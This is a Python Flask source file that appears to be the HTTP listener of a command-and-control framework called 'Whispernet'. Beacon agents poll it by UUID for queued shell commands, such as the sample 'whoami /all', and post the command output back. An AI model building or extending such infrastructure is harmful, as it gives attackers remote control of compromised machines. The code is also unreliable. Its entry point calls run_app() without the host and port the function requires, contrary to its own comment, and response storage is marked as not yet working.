# file: app.py
from flask import Flask, request
from flask_restx import Api, Namespace, Resource, fields
from waitress import serve
from modules.config import Config
from plugins.beacon_http.modules.agent import Agent

app = Flask("MYSECONDAPP")
api = Api(
    app,
    version="1.0",
    title="My API",
    description="Whispernet HTTP Endpoint",
    doc="/docs",
)


# ------------------------------------------------------------------------------------
#   Namespace
# ------------------------------------------------------------------------------------


# 1) Create Namespace
beacon_http_ns = Namespace("Example: GET/POST", description="GET and POST demo")

# 2) Example data
json_response = {"command": "shell", "args": "whoami /all"}

# ------------------------------------------------------------------------------------
#  Models
# ------------------------------------------------------------------------------------


# 3) Define models
post_input_model = beacon_http_ns.model(
    "PostInput",
    {
        "data": fields.String(required=False, description="data to post back"),
        "command_id": fields.String(required=False, description="Command id"),
    },
)
post_output_model = beacon_http_ns.model(
    "PostOutput",
    {
        "status": fields.String(description="Status of the operation"),
        "data": fields.Raw(description="The received data"),
    },
)


# ------------------------------------------------------------------------------------
#   Resources/Endpoints
# ------------------------------------------------------------------------------------


## MOVE ME TO BEACON_HTTP. TEMP TESTING HERE!!!
@beacon_http_ns.route("/get/<string:agent_uuid>")
@beacon_http_ns.doc(description="")
class AgentDequeueCommandResource(Resource):
    """
    ...
    """

    @beacon_http_ns.doc(
        responses={
            200: "Success",
            400: "Bad Request",
            401: "Missing Auth",
            500: "Server Side error",
        },
    )
    # @ping_ns.marshal_with(ping_response, code=200)
    def get(self, agent_uuid):
        """
        Dequeue a command

        Returns:
            JSON: {"command": <command>, "args": <args>}

        """
        try:
            a = Agent(agent_id=agent_uuid)
            command_object = a.dequeue_command()

            command = command_object.command
            command_id = command_object.command_id

            # Ensure command is a string
            if not command or not isinstance(command, str):
                return {"command": None, "args": None}  # Handle empty commands

            # Split command into parts
            parts = command.strip().split(" ", 1)  # Split at first space

            command_name = parts[0]  # First word
            args = parts[1] if len(parts) > 1 else ""  # Everything else

            response_dict = {
                "command_id": command_id,
                "command": command_name,
                "args": args,
            }
            return response_dict
        except Exception as e:
            print(e)
            return "", 500


@beacon_http_ns.route("/post/<string:agent_uuid>")
class PostResource(Resource):
    @beacon_http_ns.expect(post_input_model)
    @beacon_http_ns.marshal_with(post_output_model)
    def post(self, agent_uuid):
        """Receives JSON data and returns it in a response."""
        try:
            response = beacon_http_ns.payload
            print("Received POST data:", response)

            # uuid = response.get("id", "")
            data = response.get("data", "")
            command_id = response.get("command_id", "")

            a = Agent(agent_uuid)

            # change

            # need to get COMMAND ID here... maybe have agent send back.
            # note, not actually storing yet.
            a.store_response(command_id, data)

            return {"status": "received", "data": data}, 200
        except Exception as e:
            print(e)
            return "", 500


# 5) Register the Namespace
api.add_namespace(beacon_http_ns, path="/")


def run_app(host, port):
    """
    Run the Flask-RESTX application on the given host/port.

    Use waitress to serve.
    """
    serve(app, host=host, port=port)

    # app.run(host=host, port=port, debug=False)


# If you run `python app.py` directly, it defaults to 5000
if __name__ == "__main__":
    run_app()  # same as run_app("0.0.0.0", 5000)
